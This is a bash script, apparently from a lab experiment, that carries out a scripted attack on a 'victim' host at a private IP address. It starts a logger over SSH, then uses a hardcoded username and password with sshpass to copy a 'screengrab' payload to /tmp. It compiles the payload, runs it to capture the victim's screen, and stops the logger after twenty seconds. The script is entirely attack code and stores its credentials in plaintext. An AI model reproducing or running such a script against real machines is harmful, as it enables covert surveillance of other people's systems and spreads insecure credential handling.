#!/bin/bash
USERNAME="kalana"
HOSTNAME="172.25.1.5"
PASSWORD="131kalana"
SCRIPT="cd Desktop/logger; sudo ./logger </dev/null >/dev/null 2>&1 &"

echo "[1] Starting logger on victim"
ssh -f ${USERNAME}@${HOSTNAME} "${SCRIPT}"

echo "[2] Sending pay load"
# inject the payload to /tmp
sshpass -p $PASSWORD scp screengrab.zip $USERNAME@$HOSTNAME:/tmp

echo "[3] Executing the attack"
# unzip it, install dependencies and compile and execute screengrab
sshpass -p $PASSWORD ssh -t $USERNAME@$HOSTNAME 'cd /tmp; unzip screengrab.zip; cd screengrab; sudo apt-get install libx11-dev libpng-dev; make clean; make; ./screengrab /home/kalana/Desktop/attack'

echo "[4] Waiting for 20 seconds"
sshpass -p $PASSWORD ssh -t $USERNAME@$HOSTNAME 'sleep 20; pkill -SIGINT logger'
echo "[5] Logger terminated"


